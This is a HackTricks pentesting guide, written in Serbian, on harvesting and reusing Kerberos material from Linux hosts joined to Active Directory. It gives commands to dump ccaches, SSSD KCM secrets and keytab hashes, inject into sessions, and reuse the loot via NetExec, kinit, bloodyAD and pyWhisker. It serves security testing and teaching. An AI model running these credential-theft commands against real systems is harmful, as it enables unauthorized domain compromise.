# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux mašina takođe može biti prisutna unutar Active Directory okruženja.

Linux mašina unutar AD-a može **lokalno čuvati Kerberos materijal**: korisničke ccaches, keytab-ove mašina/servisa i tajne kojima upravlja SSSD. Ovi artefakti se obično mogu ponovo koristiti kao bilo koji drugi Kerberos credential. Da biste pročitali većinu njih, moraćete biti korisnik-vlasnik ticketa ili **root** na mašini.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeracija

### Enumeracija AD-a iz linuxa

Ako imate pristup AD-u iz linuxa (ili bash-u u Windowsu), možete pokušati sa [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) da enumerišete AD.

Takođe možete pogledati sledeću stranicu da naučite **druge načine za enumeraciju AD-a iz linuxa**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA je open-source **alternativa** Microsoft Windows **Active Directory-ju**, prvenstveno za **Unix** okruženja. Kombinuje kompletan **LDAP direktorijum** sa MIT **Kerberos** Key Distribution Center-om za upravljanje slično Active Directory-ju. Korišćenjem Dogtag **Certificate System**-a za upravljanje CA i RA sertifikatima, podržava **multi-factor** autentifikaciju, uključujući smartcard uređaje. SSSD je integrisan za Unix procese autentifikacije.<sup>[[14]](#references)[[15]](#references)</sup> Saznajte više o tome na:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakti hosta pridruženog domenu

Pre rada sa ticketima, utvrdite **kako je host pridružen AD-u** i **gde se Kerberos materijal zaista čuva**. Na modernim Linux hostovima ovim se obično upravlja pomoću `realmd` + `adcli` + `sssd`, a ne samo preko običnih fajlova u `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Ovo vam brzo govori da li host veruje AD-u, da li SSSD kešira identitete ili ticket-e i da li su **machine/service keytab** ili **KCM secrets** dostupni za zloupotrebu.<sup>[[4]](#references)[[10]](#references)</sup>

## Rad sa ticket-ima

### Pass The Ticket

Na ovoj stranici pronaći ćete različita mesta na kojima možete **pronaći Kerberos ticket-e unutar Linux hosta**; na sledećoj stranici možete naučiti kako da konvertujete ove CCache formate ticket-a u Kirbi (format koji je potreban za upotrebu u Windows-u), kao i kako da izvedete PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ako želite **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, itd.), pogledajte posvećenu stranicu:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponovna upotreba CCACHE ticket-a iz /tmp

CCACHE fajlovi su binarni formati za **čuvanje Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` je i dalje čest, ali moderne Linux implementacije takođe koriste `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ili `KCM:%{uid}`. Proverite environment variable **`KRB5CCNAME`** i podešavanje `default_ccache_name` pre nego što pretpostavite da se ticket-i nalaze u `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Ponovna upotreba CCACHE tiketa iz keyringa

**Kerberos tiketi sačuvani u memoriji procesa mogu se izdvojiti**, naročito kada je zaštita od `ptrace` onemogućena (`/proc/sys/kernel/yama/ptrace_scope`). Koristan alat za ovu svrhu dostupan je na adresi [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), koji olakšava izdvajanje ubacivanjem u sesije i izbacivanjem tiketa u `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Za konfiguraciju i korišćenje ovog alata prate se koraci u nastavku:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ova procedura će pokušati da izvrši injection u različite sesije, pri čemu će uspeh biti označen čuvanjem izvučenih ticket-a u `/tmp`, prema konvenciji imenovanja `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Ponovna upotreba CCACHE ticket-a iz SSSD KCM-a

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući ključ se čuva kao skrivena datoteka na putanji `/var/lib/sss/secrets/.secrets.mkey`. Podrazumevano, ključ je čitljiv samo ako imate **root** dozvole.<sup>[[4]](#references)</sup>

Pozivanje **`SSSDKCMExtractor`** sa parametrima --database i --key parsiraće bazu podataka i **dešifrovati secrets**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor ispisuje sirove Kerberos JSON payload-e; konvertujte ih u upotrebljivi ticket cache ili drugi format tiketa pre izvođenja pass-the-cache/pass-the-ticket operacija.<sup>[[4]](#references)</sup>

### Brza triage provera keytab-a
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Izdvajanje naloga iz /etc/krb5.keytab

Ključevi servisnih naloga, neophodni za servise koji rade sa root privilegijama, bezbedno se čuvaju u datotekama **`/etc/krb5.keytab`**. Ovi ključevi, slični lozinkama za servise, zahtevaju strogu poverljivost.<sup>[[5]](#references)</sup>

Za pregled sadržaja keytab datoteke može se koristiti **`klist`**. Na Linuxu, `klist -k -K -e` ispisuje principale, brojeve verzija ključeva, tipove enkripcije i sirovi materijal ključa. Ako je tip ključa **23 / RC4-HMAC**, vrednost ključa je takođe **NT hash** tog principala.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Za Linux korisnike, **`KeyTabExtract`** omogućava ekstrakciju RC4 HMAC hash-a, koji se može iskoristiti za ponovnu upotrebu NTLM hash-a. Imajte na umu da ovo pomaže samo kada keytab i dalje sadrži materijal **etype 23 / RC4-HMAC**. U okruženjima koja koriste samo **AES**, možda nećete dobiti ponovo upotrebljiv NT hash, ali i dalje možete direktno da se autentifikujete pomoću keytab-a preko Kerberos-a.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS-u, **`bifrost`** služi kao alat za analizu keytab datoteka.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Korišćenjem izdvojenih informacija o nalozima i hash vrednostima, veze sa serverima mogu se uspostaviti pomoću alata kao što je **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Ponovna upotreba mašinskog naloga iz `/etc/krb5.keytab`

Na sistemima pridruženim pomoću `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` obično sadrži **nalog računara** i jedan ili više **host/service principal-a**. Ako imate **root**, nemojte ga samo dumpovati: koristite jedan od principal-a navedenih pomoću `klist -k` da zatražite TGT i radite kao sam Linux host.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Ovo je naročito korisno kada sam **computer object** ima delegirana prava u AD-u ili kada je hostu dozvoljeno da preuzme druge secrets, kao što je **gMSA**.<sup>[[13]](#references)</sup>

### Ponovna upotreba ukradenog Kerberos materijala pomoću AD alata namenjenih Linuxu

Kada imate validan `ccache` ili upotrebljiv keytab, možete raditi sa AD-om **direktno iz Linuxa**, bez prethodnog konvertovanja svega u Windows formate. Mnogi moderni alati izvorno podržavaju `KRB5CCNAME` / Kerberos autentifikaciju.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ovo je dobra veza između **Linux post-exploitation** i **AD object abuse**. Za same putanje zloupotrebe na nivou objekata pogledajte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefakti

Novije Linux implementacije mogu direktno da koriste **Managed Service Accounts** iz AD-a. U praksi to znači da, nakon kompromitovanja Linux servera, možete pronaći ne samo host keytab već i **service-specific keytabs** generisane iz gMSA naloga. Uobičajena mesta za proveru su `/etc/gmsad.conf`, konfiguracione datoteke specifične za implementaciju i dodatne `*.keytab` datoteke u direktorijumu `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Ovo vam daje ponovo upotrebljiv Kerberos identitet za SPN-ove povezane sa tim gMSA nalogom, **bez pristupanja bilo kom Windows endpointu**.<sup>[[13]](#references)</sup> Za zloupotrebu gMSA/dMSA naloga **na strani domena** nakon sticanja viših privilegija u AD-u, pogledajte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Pristup AD-u pomoću managed service account naloga – Direktna integracija RHEL sistema sa Active Directory-jem](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Varijable okruženja za Kerberos – MIT Kerberos dokumentacija](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos dokumentacija](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: RC4-HMAC Kerberos tipovi šifrovanja koje koristi Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Korišćenje Kerberos-a | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Otkrivanje domena identiteta i pridruživanje njima | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD vodič za korisnike](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [O projektu | FreeIPA dokumentacija](https://www.freeipa.org/About.html)
- [15] [Beleške o izdanju FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos dokumentacija](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
